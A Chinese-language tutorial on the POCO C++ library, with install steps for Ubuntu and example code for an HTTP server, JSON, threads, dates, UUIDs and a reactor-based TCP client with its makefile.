※Ubuntu 123456789101112131415161718# apt安装sudo apt install libpoco-dev# 源码安装# 安装依赖sudo apt-get install -y g++ make openssl libssl-dev# 下载解压wget https://pocoproject.org/releases/poco-1.11.0/poco-1.11.0-all.tar.gztar -xvf poco-1.11.0-all.tar.gz# 编译cd poco-1.11.0-all./configure --no-tests --no-samplescd buildcmake .. &amp;&amp; makesudo make install# 链接需要用到的组件，-lPocoFoundation -lPocoUtil -lPocoNet -lPocoXML是4个基本组件g++ -o main main.cpp -lPocoFoundation -lPocoUtil -lPocoNet -lPocoJSON &amp;&amp; ./main ※web服务示例 官方示例，实现了一个简单的多线程web服务器，为单个HTML页面提供服务，使用Foundation, Net和Util库，生成的网页在8080端口： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263#include &quot;Poco/Net/HTTPServer.h&quot;#include &quot;Poco/Net/HTTPRequestHandler.h&quot;#include &quot;Poco/Net/HTTPRequestHandlerFactory.h&quot;#include &quot;Poco/Net/HTTPServerRequest.h&quot;#include &quot;Poco/Net/HTTPServerResponse.h&quot;#include &quot;Poco/Net/ServerSocket.h&quot;#include &quot;Poco/Util/ServerApplication.h&quot;#include &lt;iostream&gt;using namespace Poco;using namespace Poco::Net;using namespace Poco::Util;class HelloRequestHandler: public HTTPRequestHandler&#123; void handleRequest(HTTPServerRequest&amp; request, HTTPServerResponse&amp; response) &#123; Application&amp; app = Application::instance(); app.logger().information(&quot;Request from %s&quot;, request.clientAddress().toString()); response.setChunkedTransferEncoding(true); response.setContentType(&quot;text/html&quot;); response.send() &lt;&lt; &quot;&lt;html&gt;&quot; &lt;&lt; &quot;&lt;head&gt;&lt;title&gt;Hello&lt;/title&gt;&lt;/head&gt;&quot; &lt;&lt; &quot;&lt;body&gt;&lt;h1&gt;Hello from the POCO Web Server&lt;/h1&gt;&lt;/body&gt;&quot; &lt;&lt; &quot;&lt;/html&gt;&quot;; &#125;&#125;;class HelloRequestHandlerFactory: public HTTPRequestHandlerFactory&#123; HTTPRequestHandler* createRequestHandler(const HTTPServerRequest&amp;) &#123; return new HelloRequestHandler; &#125;&#125;;class WebServerApp: public ServerApplication&#123; void initialize(Application&amp; self) &#123; loadConfiguration(); ServerApplication::initialize(self); &#125; int main(const std::vector&lt;std::string&gt;&amp;) &#123; UInt16 port = static_cast&lt;UInt16&gt;(config().getUInt(&quot;port&quot;, 8080)); HTTPServer srv(new HelloRequestHandlerFactory, port); srv.start(); logger().information(&quot;HTTP Server started on port %hu.&quot;, port); waitForTerminationRequest(); logger().information(&quot;Stopping HTTP Server...&quot;); srv.stop(); return Application::EXIT_OK; &#125;&#125;;POCO_SERVER_MAIN(WebServerApp) 编译运行： 1g++ -o main main.cpp -lPocoFoundation -lPocoNet -lPocoUtil &amp;&amp; ./main ※Json解析示例 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677#include &lt;iostream&gt;#include &lt;fstream&gt;#include &quot;Poco/JSON/Object.h&quot;#include &quot;Poco/JSON/Parser.h&quot;#include &quot;Poco/Dynamic/Var.h&quot;#include &quot;Poco/JSON/Stringifier.h&quot;int main()&#123; /* 解析json &amp; 从文件中解析json */ std::string jsonString = R&quot;(&#123;&quot;name&quot;: &quot;John&quot;, &quot;age&quot;: 30, &quot;city&quot;: &quot;New York&quot;&#125;)&quot;; // std::ifstream file(&quot;data.json&quot;); // if (!file.is_open()) &#123; // std::cerr &lt;&lt; &quot;Failed to open file.&quot; &lt;&lt; std::endl; // return 1; // &#125; // std::string jsonString((std::istreambuf_iterator&lt;char&gt;(file)), std::istreambuf_iterator&lt;char&gt;()); // 创建 JSON 解析器 Poco::JSON::Parser parser; Poco::Dynamic::Var result; try &#123; // 解析 JSON 字符串 result = parser.parse(jsonString); &#125; catch (const Poco::Exception&amp; ex) &#123; std::cerr &lt;&lt; &quot;JSON parsing error: &quot; &lt;&lt; ex.displayText() &lt;&lt; std::endl; return 1; &#125; // 将解析结果转换为 Poco::JSON::Object 类型 Poco::JSON::Object::Ptr object = result.extract&lt;Poco::JSON::Object::Ptr&gt;(); // 获取和操作 JSON 对象中的值 std::string name = object-&gt;getValue&lt;std::string&gt;(&quot;name&quot;); int age = object-&gt;getValue&lt;int&gt;(&quot;age&quot;); std::string city = object-&gt;getValue&lt;std::string&gt;(&quot;city&quot;); // 打印结果 std::cout &lt;&lt; &quot;Name: &quot; &lt;&lt; name &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Age: &quot; &lt;&lt; age &lt;&lt; std::endl; std::cout &lt;&lt; &quot;City: &quot; &lt;&lt; city &lt;&lt; std::endl; /* 生成json &amp; 写入到json文件 */ // 创建 JSON 对象 Poco::JSON::Object jsonObject; // 添加键值对 jsonObject.set(&quot;name&quot;, &quot;John&quot;); jsonObject.set(&quot;age&quot;, 30); jsonObject.set(&quot;city&quot;, &quot;New York&quot;); // 将 JSON 对象转换为字符串 std::ostringstream oss; Poco::JSON::Stringifier::stringify(jsonObject, oss); std::string jsonString2 = oss.str(); // 打印生成的 JSON 字符串 std::cout &lt;&lt; jsonString2 &lt;&lt; std::endl; // // 写入 JSON 字符串到文件 // std::ofstream file(&quot;data.json&quot;); // if (file.is_open()) &#123; // file &lt;&lt; jsonString2; // file.close(); // std::cout &lt;&lt; &quot;JSON data has been written to file.&quot; &lt;&lt; std::endl; // &#125; else &#123; // std::cerr &lt;&lt; &quot;Failed to open file.&quot; &lt;&lt; std::endl; // return 1; // &#125; return 0;&#125; ※多线程示例 12345678910111213141516171819202122232425262728293031323334353637383940#include &lt;iostream&gt;#include &quot;Poco/Thread.h&quot;#include &quot;Poco/Runnable.h&quot;class MyTask : public Poco::Runnable&#123;public: void run() override &#123; for (int i = 0; i &lt; 5; ++i) &#123; std::cout &lt;&lt; &quot;Thread ID: &quot; &lt;&lt; Poco::Thread::currentTid() &lt;&lt; &quot; Task ID: &quot; &lt;&lt; i &lt;&lt; std::endl; Poco::Thread::sleep(1000); &#125; &#125;&#125;;int main()&#123; // 创建线程任务对象 MyTask task; // 创建线程对象并启动 Poco::Thread thread; thread.start(task); // 主线程继续执行其他任务 for (int i = 0; i &lt; 5; ++i) &#123; std::cout &lt;&lt; &quot;Main Thread ID: &quot; &lt;&lt; Poco::Thread::currentTid() &lt;&lt; &quot; Main Task ID: &quot; &lt;&lt; i &lt;&lt; std::endl; Poco::Thread::sleep(500); &#125; // 等待子线程结束 thread.join(); return 0;&#125; ※日期时间示例 1234567891011121314151617181920212223242526#include &lt;iostream&gt;#include &quot;Poco/DateTime.h&quot;#include &quot;Poco/DateTimeFormatter.h&quot;int main()&#123; // 获取当前日期和时间 Poco::DateTime now; // 格式化日期和时间为字符串 std::string formattedDateTime = Poco::DateTimeFormatter::format(now, &quot;%Y-%m-%d %H:%M:%S&quot;); // 输出格式化后的日期和时间 std::cout &lt;&lt; &quot;Formatted Date and Time: &quot; &lt;&lt; formattedDateTime &lt;&lt; std::endl; // 获取日期部分 Poco::DateTime date(now.year(), now.month(), now.day()); // 格式化日期为字符串 std::string formattedDate = Poco::DateTimeFormatter::format(date, &quot;%Y-%m-%d&quot;); // 输出格式化后的日期 std::cout &lt;&lt; &quot;Formatted Date: &quot; &lt;&lt; formattedDate &lt;&lt; std::endl; return 0;&#125; ※生成uuid示例 123456789101112131415161718192021#include &lt;iostream&gt;#include &quot;Poco/UUIDGenerator.h&quot;#include &quot;Poco/UUID.h&quot;int main()&#123; // 使用默认的UUID生成器 Poco::UUIDGenerator generator; // 生成一个随机UUID Poco::UUID uuid1 = generator.createRandom(); // 生成一个基于时间的UUID Poco::UUID uuid2 = generator.createOne(); // 输出UUID std::cout &lt;&lt; &quot;Random UUID: &quot; &lt;&lt; uuid1.toString() &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Time-based UUID: &quot; &lt;&lt; uuid2.toString() &lt;&lt; std::endl; return 0;&#125; ※poco 网络编程[6] 1234567891011讲一下，网络IO模型有哪几个种类， 阻塞：1.一问一答(send()一个，recv() 一个)2.一问多答(send()一个，recv() 多个) 非阻塞：1.一个线程一直recv(), send() 按需发送2.一个线程send()，一个线程recv() 所有的网络IO模型 ,建议参考 陈硕 &lt;linux网络编程&gt; 参考【翻译】两种高性能I/O设计模式(Reactor/Proactor)的比较 还需要根据自己的业务 确认使用长连接,短连接(有状态,无状态), TCP还是UDP, 服务端超时T线, 黑名单, ! 如何使用POCO 最好还是应该从代码实现来看，确认各个类的继承关系，全部看完基本就知道，自己要用什么了。（使用参考TestSuit,Sample） 123456789101112131415161718192021222324252627282930看需求，确认用哪个类， - 如果你用http进行POST GET REQUEST处理，那么 *HTTP、HTTPClient、 HTTPServer*应该是你的选择， - 如果你要用ping命令探查一些主机是否在线，那么就用*ICMP* 。 - 如果要用socket进行收发数据， 先确认 是写client端还是Server端, 使用TCP还是UDP，是阻塞还是非阻塞，是否有发广播等等... client可以用：【Socket】中的Socket,StreamSocket, RawSocket,DatagramSocket... Server可以用：【Socket】中的Socket,StreamSocket, RawSocket,DatagramSocket... 【Reactor】中的ParallelSocketAcceptor，ParallelSocketReactor，SocketAcceptor，SocketConnector，SocketNotification，SocketNotifier，SocketReactor 【TCPServer】中的TCPServer，TCPServerConnection，TCPServerConnectionFactory，TCPServerDispatcher，TCPServerParams当然这只是其中的很小一部分。无状态，sendBytes()，recvBytes()都是不确定的首先sendBytes()有事件就发送，很简单没问题。那recvBytes()呢？如何一直接收数据？ 这又回到更原始的问题，网络模型 select,poll，epoll，是什么，用什么实现的。我们知道，select,poll都是先把fd加入set中， 然后对set中所有fd进行轮训，确认是否可以read，write,或者exception.首先系统函数select中只是对set中所有的fd进行轮训一次。 那么select(),poll(),只是查询一次， 如果下次又来了数据怎么办？=&gt;只能用while()不管去轮训状态了，所以不断接收数据的模型是这样的windows select参考https://msdn.microsoft.com/en-us/library/system.net.sockets.socket.select(v=vs.110).aspxhttps://msdn.microsoft.com/en-us/library/windows/desktop/ms740141(v=vs.85).aspxunix-like 参考http://www.tenouk.com/Module41.html ※使用poco库，实现tcp client例子[7] ※base_socket_connector.h文件，可以不用改动 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166#ifndef _BASE_SOCKET_CONNECTOR_H_#define _BASE_SOCKET_CONNECTOR_H_#include &lt;iostream&gt;#include &quot;Poco/Net/Net.h&quot;#include &quot;Poco/Net/SocketNotification.h&quot;#include &quot;Poco/Net/SocketAddress.h&quot;#include &quot;Poco/Net/StreamSocket.h&quot;#include &quot;Poco/Observer.h&quot;typedef void (*CliSendCbFunc)(void *send_args, unsigned char *send_data, int max_send_len, int &amp;send_len);typedef void (*CliRecvCbFunc)(void *recv_args, unsigned char *recv_data, int &amp;recv_len);typedef struct TcpClientCallbackData&#123; CliSendCbFunc send_loaddata; // 装载待发送数据，send_data是要发送的数据，send_len是要发送的长度 CliRecvCbFunc recv_callback; // 收到数据后的回调函数，recv_data是接收到的数据，recv_len是接收的数据长度 unsigned char *send_buf; // 使用者提供的发送数据缓存空间，调用send_loaddata函数后，先将待发送数据拷贝到这里 unsigned char *recv_buf; // 使用者提供的接收数据缓存空间，当系统有可接收数据时，先接收到这里，再调用recv_callback，传递给使用者 int send_len; // 实际发送数据的长度 int max_send_len; // send_buf的最大长度 int max_recv_len; // recv_buf的最大长度 void *send_args; // 存放使用者自己的私有数据 void *recv_args; // 存放使用者自己的私有数据&#125; TcpClientCallbackData;template &lt;class TcpClientHandle&gt;class BaseSocketConnector&#123; public: explicit BaseSocketConnector(Poco::Net::SocketAddress &amp;address) : socket_reactor_(0) &#123; stream_socket_.connectNB(address); &#125; BaseSocketConnector(Poco::Net::SocketAddress &amp;address, Poco::Net::SocketReactor &amp;reactor, TcpClientCallbackData &amp;tcp_client_callback) : socket_reactor_(0) &#123; stream_socket_.connectNB(address); RegisterConnector(reactor); tcp_client_callback_ = tcp_client_callback; &#125; virtual ~BaseSocketConnector() &#123; try &#123; UnregisterConnector(); &#125; catch (...) &#123; poco_unexpected(); &#125; &#125; virtual void RegisterConnector(Poco::Net::SocketReactor &amp;reactor) &#123; socket_reactor_ = &amp;reactor; socket_reactor_-&gt;addEventHandler(stream_socket_, Poco::Observer&lt;BaseSocketConnector, Poco::Net::ReadableNotification&gt;(*this, &amp;BaseSocketConnector::OnReadable)); socket_reactor_-&gt;addEventHandler(stream_socket_, Poco::Observer&lt;BaseSocketConnector, Poco::Net::WritableNotification&gt;(*this, &amp;BaseSocketConnector::OnWritable)); socket_reactor_-&gt;addEventHandler(stream_socket_, Poco::Observer&lt;BaseSocketConnector, Poco::Net::TimeoutNotification&gt;(*this, &amp;BaseSocketConnector::OnTimeout)); socket_reactor_-&gt;addEventHandler(stream_socket_, Poco::Observer&lt;BaseSocketConnector, Poco::Net::ErrorNotification&gt;(*this, &amp;BaseSocketConnector::OnError)); &#125; virtual void UnregisterConnector() &#123; if (socket_reactor_) &#123; socket_reactor_-&gt;removeEventHandler(stream_socket_, Poco::Observer&lt;BaseSocketConnector, Poco::Net::ReadableNotification&gt;(*this, &amp;BaseSocketConnector::OnReadable)); socket_reactor_-&gt;removeEventHandler(stream_socket_, Poco::Observer&lt;BaseSocketConnector, Poco::Net::WritableNotification&gt;(*this, &amp;BaseSocketConnector::OnWritable)); socket_reactor_-&gt;removeEventHandler(stream_socket_, Poco::Observer&lt;BaseSocketConnector, Poco::Net::TimeoutNotification&gt;(*this, &amp;BaseSocketConnector::OnTimeout)); socket_reactor_-&gt;removeEventHandler(stream_socket_, Poco::Observer&lt;BaseSocketConnector, Poco::Net::ErrorNotification&gt;(*this, &amp;BaseSocketConnector::OnError)); &#125; &#125; void OnReadable(Poco::Net::ReadableNotification *readable_notification) &#123; readable_notification-&gt;release(); int err = stream_socket_.impl()-&gt;socketError(); if (err) &#123; OnError(err); UnregisterConnector(); &#125; else &#123; OnConnect(); &#125; &#125; void OnWritable(Poco::Net::WritableNotification *writable_notification) &#123; writable_notification-&gt;release(); OnConnect(); &#125; void OnConnect() &#123; stream_socket_.setBlocking(true); NewTcpClientHandle(); UnregisterConnector(); &#125; void OnError(Poco::Net::ErrorNotification *error_notification) &#123; error_notification-&gt;release(); OnError(stream_socket_.impl()-&gt;socketError()); &#125; void OnTimeout(Poco::Net::TimeoutNotification *timeout_notification) &#123; timeout_notification-&gt;release(); OnError(stream_socket_.impl()-&gt;socketError()); &#125; // void GetSendLen(int &amp;send_len) &#123; send_len = tcp_client_callback_.send_len; &#125; protected: virtual TcpClientHandle *NewTcpClientHandle() &#123; return new TcpClientHandle(stream_socket_, socket_reactor_, tcp_client_callback_); &#125; virtual void OnError(int errorCode) &#123; socket_reactor_-&gt;stop(); stream_socket_.close(); &#125; Poco::Net::SocketReactor *GetReactor() &#123; return socket_reactor_; &#125; Poco::Net::StreamSocket &amp;GetSocket() &#123; return stream_socket_; &#125; private: BaseSocketConnector(); BaseSocketConnector(const BaseSocketConnector &amp;); BaseSocketConnector &amp;operator=(const BaseSocketConnector &amp;); Poco::Net::StreamSocket stream_socket_; Poco::Net::SocketReactor *socket_reactor_; // TcpClientCallbackData tcp_client_callback_;&#125;;#endif // _BASE_SOCKET_CONNECTOR_H_ ※base_tcp_client.h，根据应用，可以进行修改 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131#ifndef _BASE_TCP_CLIENT_H_#define _BASE_TCP_CLIENT_H_#include &lt;iostream&gt;#include &quot;base_socket_connector.h&quot;#include &quot;Poco/Net/Net.h&quot;#include &quot;Poco/Net/SocketNotification.h&quot;#include &quot;Poco/Net/SocketAddress.h&quot;#include &quot;Poco/Net/StreamSocket.h&quot;#include &quot;Poco/Observer.h&quot;class BaseTcpClient&#123; public: BaseTcpClient(Poco::Net::StreamSocket &amp;socket, Poco::Net::SocketReactor *reactor, TcpClientCallbackData &amp;tcp_client_callback) : socket_(socket), reactor_(reactor), on_readable_(*this, &amp;BaseTcpClient::OnReadable), on_writable_(*this, &amp;BaseTcpClient::OnWritable), on_timeout_(*this, &amp;BaseTcpClient::OnTimeout), timeout_(false), close_on_timeout_(false), tcp_client_callback_(0) &#123; tcp_client_callback_ = &amp;tcp_client_callback; reactor_-&gt;addEventHandler(socket_, on_readable_); reactor_-&gt;addEventHandler(socket_, on_writable_); reactor_-&gt;addEventHandler(socket_, on_timeout_); &#125; ~BaseTcpClient() &#123; reactor_-&gt;removeEventHandler(socket_, Poco::Observer&lt;BaseTcpClient, Poco::Net::ReadableNotification&gt;(*this, &amp;BaseTcpClient::OnReadable)); reactor_-&gt;removeEventHandler(socket_, Poco::Observer&lt;BaseTcpClient, Poco::Net::WritableNotification&gt;(*this, &amp;BaseTcpClient::OnWritable)); reactor_-&gt;removeEventHandler(socket_, Poco::Observer&lt;BaseTcpClient, Poco::Net::TimeoutNotification&gt;(*this, &amp;BaseTcpClient::OnTimeout)); &#125; void OnReadable(Poco::Net::ReadableNotification *readable_notification) &#123; int recv_len = 0; readable_notification-&gt;release(); if (NULL == tcp_client_callback_) &#123; return; &#125; recv_len = socket_.receiveBytes(tcp_client_callback_-&gt;recv_buf, tcp_client_callback_-&gt;max_recv_len); if (recv_len &gt; 0) &#123; // 使用者的回调函数，由使用者处理接收到的数据 tcp_client_callback_-&gt;recv_callback(tcp_client_callback_-&gt;recv_args, tcp_client_callback_-&gt;recv_buf, recv_len); &#125; else &#123; std::cout &lt;&lt; &quot;BaseTcpClient - Read Error.&quot; &lt;&lt; std::endl; reactor_-&gt;stop(); socket_.close(); delete this; &#125; &#125; void OnWritable(Poco::Net::WritableNotification *writable_notification) &#123; writable_notification-&gt;release(); if (NULL == tcp_client_callback_) &#123; return; &#125; // 回调获取使用者发送的数据 tcp_client_callback_-&gt;send_len = -1; tcp_client_callback_-&gt;send_loaddata(tcp_client_callback_-&gt;send_args, tcp_client_callback_-&gt;send_buf, tcp_client_callback_-&gt;max_send_len, tcp_client_callback_-&gt;send_len); // 待发送数据长度大于0 if (tcp_client_callback_-&gt;send_len &gt;= 0) &#123; // 调用实际发送函数 tcp_client_callback_-&gt;send_len = socket_.sendBytes(tcp_client_callback_-&gt;send_buf, tcp_client_callback_-&gt;send_len); &#125; if (tcp_client_callback_-&gt;send_len &lt; 0) &#123; std::cout &lt;&lt; &quot;BaseTcpClient - Wirte Error.&quot; &lt;&lt; std::endl; &#125; &#125; void OnTimeout(Poco::Net::TimeoutNotification *timeout_notification) &#123; timeout_notification-&gt;release(); timeout_ = true; if (close_on_timeout_) &#123; reactor_-&gt;stop(); socket_.close(); delete this; &#125; &#125; private: Poco::Net::StreamSocket socket_; Poco::Net::SocketReactor *reactor_; Poco::Observer&lt;BaseTcpClient, Poco::Net::ReadableNotification&gt; on_readable_; Poco::Observer&lt;BaseTcpClient, Poco::Net::WritableNotification&gt; on_writable_; Poco::Observer&lt;BaseTcpClient, Poco::Net::TimeoutNotification&gt; on_timeout_; bool timeout_; bool close_on_timeout_; private: // TcpClientCallbackData *tcp_client_callback_;&#125;;#endif // _BASE_TCP_CLIENT_H_ ※main.c： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;stddef.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/time.h&gt;#include &lt;fcntl.h&gt;#include &lt;termios.h&gt;#include &lt;pthread.h&gt;#include &lt;netinet/in.h&gt;#include &lt;sys/socket.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;uv.h&gt;#include &lt;iostream&gt;#include &lt;sstream&gt;#include &quot;Poco/Net/SocketReactor.h&quot;#include &quot;Poco/Net/SocketNotification.h&quot;#include &quot;Poco/Net/SocketAcceptor.h&quot;#include &quot;Poco/Net/ParallelSocketAcceptor.h&quot;#include &quot;Poco/Net/StreamSocket.h&quot;#include &quot;Poco/Net/ServerSocket.h&quot;#include &quot;Poco/Net/SocketAddress.h&quot;#include &quot;Poco/Observer.h&quot;#include &quot;Poco/Exception.h&quot;#include &quot;Poco/LocalDateTime.h&quot;#include &quot;Poco/DateTime.h&quot;#include &quot;Poco/DateTimeFormat.h&quot;#include &quot;Poco/DateTimeFormatter.h&quot;#include &quot;Poco/DateTimeParser.h&quot;#include &quot;Poco/Mutex.h&quot;#include &quot;Poco/Thread.h&quot;#include &quot;Poco/ThreadTarget.h&quot;#include &quot;base_tcp_client.h&quot;/***************************************************************************** * * Macro definition * *****************************************************************************///#define CCT_CAMERA_SERVER_IP (&quot;127.0.0.1&quot;)#define CCT_CAMERA_SERVER_PORT (8080)/***************************************************************************** * * Structure/Class definition * *****************************************************************************/#define MAX_BUF_SIZE 2048#define MAX_ONSEND_INTERVAL 10 /// ms/***************************************************************************** * * Data definition * *****************************************************************************///static pthread_cond_t send_ready = PTHREAD_COND_INITIALIZER;static pthread_mutex_t send_lock = PTHREAD_MUTEX_INITIALIZER;static uint8_t user_send_buf[2048];static int user_send_len;/***************************************************************************** * * Function prototype * *****************************************************************************////***************************************************************************** * * Function entity * *****************************************************************************///void PrintTimeStamp(char *str) &#123; struct timeval tv; gettimeofday(&amp;tv, NULL); printf(&quot;Time Stamp - %s, %ld:%ld\\n\\r&quot;, str, tv.tv_sec, tv.tv_usec);&#125;static int StartThread(void *(*thread_entry)(void *), void *thread_para) &#123; int rtn; pthread_attr_t thread_attr; pthread_t thread_ID; pthread_attr_init(&amp;thread_attr); pthread_attr_setdetachstate(&amp;thread_attr, PTHREAD_CREATE_DETACHED); rtn = pthread_create(&amp;thread_ID, &amp;thread_attr, thread_entry, thread_para); return rtn;&#125;void UserSendFuncLoadData_(void)&#123; pthread_mutex_lock(&amp;send_lock); Poco::LocalDateTime now; std::string time_str = Poco::DateTimeFormatter::format(now, Poco::DateTimeFormat::ISO8601_FRAC_FORMAT); user_send_len = sprintf((char *)user_send_buf, &quot;Hello, %s&quot;, time_str.c_str()); user_send_buf[user_send_len] = 0; user_send_len ++; pthread_cond_signal(&amp;send_ready); pthread_mutex_unlock(&amp;send_lock);&#125;void UserSendFuncLoadData(void *send_args, unsigned char *send_data, int max_send_len, int &amp;send_len)&#123; pthread_mutex_lock(&amp;send_lock); pthread_cond_wait(&amp;send_ready, &amp;send_lock); strcpy((char *)send_data, (char *)user_send_buf); send_len = sprintf((char *)send_data, &quot;%s, %s\\n\\r&quot;, (char *)user_send_buf, (char *)send_args); send_data[send_len ++] = 0; //printf(&quot;%s - %s\\n\\r&quot;, __func__, send_data); pthread_mutex_unlock(&amp;send_lock);&#125;void UserRecvFuncCallback(void *recv_args, unsigned char *recv_data, int &amp;recv_len)&#123; recv_data[recv_len] = &#x27;\\0&#x27;; std::cout &lt;&lt; &quot;UserRecvFuncCallback - &quot; &lt;&lt; recv_data &lt;&lt; &quot;\\n\\r&quot;;&#125;static void *SendDataThrd(void *para) &#123; while (1) &#123; UserSendFuncLoadData_(); sleep(1); &#125;&#125;static void TcpClientTestThrd(char *str)&#123; unsigned char recv_buf[MAX_BUF_SIZE]; unsigned char send_buf[MAX_BUF_SIZE]; TcpClientCallbackData tcp_client_callback_data; tcp_client_callback_data.recv_args = NULL; tcp_client_callback_data.send_args = (void *)str; tcp_client_callback_data.recv_callback = UserRecvFuncCallback; tcp_client_callback_data.send_loaddata = UserSendFuncLoadData; tcp_client_callback_data.send_buf = send_buf; tcp_client_callback_data.recv_buf = recv_buf; tcp_client_callback_data.max_recv_len = MAX_BUF_SIZE; tcp_client_callback_data.max_send_len = MAX_BUF_SIZE; int server_port = CCT_CAMERA_SERVER_PORT; std::string server_ip(CCT_CAMERA_SERVER_IP); Poco::Net::SocketAddress socket_addr(server_ip.c_str(), server_port); StartThread(SendDataThrd, NULL); do &#123; SocketReactor reactor; BaseSocketConnector&lt;BaseTcpClient&gt; connector(socket_addr, reactor, tcp_client_callback_data); //std::cout &lt;&lt; &quot;before run\\n\\r&quot;; reactor.run(); //std::cout &lt;&lt; &quot;after run\\n\\r&quot;; Poco::Thread::sleep(MAX_ONSEND_INTERVAL); &#125; while (1);&#125;int main(int argc, char ** argv)&#123; if (argc &lt; 2) &#123; printf(&quot;%s some_info\\n\\r&quot;, argv[0]); return 0; &#125; TcpClientTestThrd(argv[1]); return 0;&#125; ※makefile： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100export TOP_DIR = $(PWD)# 包含参数配置文件#include ./Makefile.param# 目标文件名称、编译后文件位置PWD := $(shell pwd)INSTALLDIR = .TARGET = tcp_client_testDBGTARGET = $(INSTALLDIR)/$(TARGET)dRLSTARGET = $(INSTALLDIR)/$(TARGET)# 配置编译器CC = $(CROSS_COMPILE)gccCXX = $(CROSS_COMPILE)g++LD_CXX = $(CROSS_COMPILE)g++STRIP = $(CROSS_COMPILE)stripRM = rm# 配置依赖头文件、库文件路径INCPATH += -I. -I$(REL_INC) -I/usr/local/include LIBPATH += -L. -L$(REL_LIB) -L/usr/local/lib # 配置编译参数FLAGS_C += $(MACRO_DEFINE) $(INCPATH) $(CFLAGS) -Wall FLAGS_CXX += $(MACRO_DEFINE) $(INCPATH) $(CFLAGS) -Wall LDFLAGS += $(CFLAGS) $(LIBPATH) $(LIBS_CFLAGS) -pie -fPIE LIBS += -lPocoFoundation -lPocoNet -lpthread -lm -lc -lgcc -lgcc_s -ldl DBG_FLAGS = -g -D__DEBUGRLS_FLAGS = -O2 -fno-strict-aliasing# 源文件包含SRCS_C = $(wildcard *.c)SRCS_CXX = $(wildcard *.cpp)SRCS_H = $(wildcard *.h*)# obj文件包含OBJ_DBG_DIR = 0-obj/$(CROSS_COMPILE)dbgOBJ_RLS_DIR = 0-obj/$(CROSS_COMPILE)rlsOBJS_C_DBG = $(addprefix $(OBJ_DBG_DIR)/,$(SRCS_C:%.c=%.o))OBJS_CXX_DBG = $(addprefix $(OBJ_DBG_DIR)/,$(SRCS_CXX:%.cpp=%.o))OBJS_C_RLS = $(addprefix $(OBJ_RLS_DIR)/,$(SRCS_C:%.c=%.o))OBJS_CXX_RLS = $(addprefix $(OBJ_RLS_DIR)/,$(SRCS_CXX:%.cpp=%.o))# 编译动作COMPILE_C = $(CC) $(FLAGS_C) -cCOMPILE_CXX = $(CXX) $(FLAGS_CXX) -cLINK_CXX = $(LD_CXX) $(LDFLAGS) .PHONY: clean debug release installall: releaseinstall: install -d $(EXEC_DIR) install $(RLSTARGET) $(EXEC_DIR) install -m 444 $(TARGET).txt $(EXEC_DIR)release: $(RLSTARGET) $(STRIP) $(RLSTARGET)debug: $(DBGTARGET) @echo $(TARGET)_debug_done$(RLSTARGET): $(OBJS_C_RLS) $(OBJS_CXX_RLS) @mkdir -p $(INSTALLDIR) $(LINK_CXX) -o $@ $^ $(LIBS) $(DBGTARGET): $(OBJS_C_DBG) $(OBJS_CXX_DBG) @mkdir -p $(INSTALLDIR) $(LINK_CXX) -o $@ $^ $(LIBS) $(OBJS_CXX_RLS): $(OBJ_RLS_DIR)/%.o: %.cpp $(SRCS_H) @mkdir -p $(OBJ_RLS_DIR) $(COMPILE_CXX) $(RLS_FLAGS) -o $@ $&lt; $(OBJS_C_RLS): $(OBJ_RLS_DIR)/%.o: %.c $(SRCS_H) @mkdir -p $(OBJ_RLS_DIR) $(COMPILE_C) $(RLS_FLAGS) -o $@ $&lt; $(OBJS_CXX_DBG): $(OBJ_DBG_DIR)/%.o: %.cpp $(SRCS_H) @mkdir -p $(OBJ_DBG_DIR) $(COMPILE_CXX) $(DBG_FLAGS) -o $@ $&lt;$(OBJS_C_DBG): $(OBJ_DBG_DIR)/%.o: %.c $(SRCS_H) @mkdir -p $(OBJ_DBG_DIR) $(COMPILE_C) $(DBG_FLAGS) -o $@ $&lt;clean: -$(RM) -rf *~ *.d .dep 0-obj ※【C++】郭老二博文之：C++目录[8] 【C++】POCO学习总结（一）：下载与编译 【C++】POCO学习总结（二）：配置选择 【C++】POCO学习总结（三）：交叉编译 【C++】POCO学习总结（四）： 在window下使用MSYS、MinGW编译POCO 【C++】POCO学习总结（五）：功能介绍 【C++】POCO学习总结（六）：线程、线程池、同步 【C++】POCO学习总结（七）：进程、管道、进程间同步、共享内存 【C++】POCO学习总结（八）：通知Notifications和事件Events 【C++】POCO学习总结（九）：网络 【C++】POCO学习总结（十）：Poco::Util::Application（应用程序框架） 【C++】POCO学习总结（十一）：文件系统（路径、文件属性、目录浏览、临时文件等） 【C++】POCO学习总结（十二）：流（文本编解码、数据压缩、文件读写流等） 【C++】POCO学习总结（十三）：类型和字节序、错误处理和调试、获取系统信息 【C++】POCO学习总结（十四）：引用计数、共享指针、缓冲区管理 【C++】POCO学习总结（十五）：字符串操作 【C++】POCO学习总结（十六）：随机数、密码、时间戳、日期和时间（格式化与解析）、时区、本地时间 【C++】POCO学习总结（十七）：日志系统（级别、通道、格式化、记录流） 【C++】POCO学习总结（十八）：XML 【C++】POCO学习总结（十九）：哈希、URL、UUID、配置文件、日志配置、动态库加载 https://blog.csdn.net/poechant/article/details/7485760 ↩︎ https://blog.csdn.net/flyfish1986/article/details/130985212 ↩︎ https://blog.csdn.net/poechant/article/details/7485760 ↩︎ 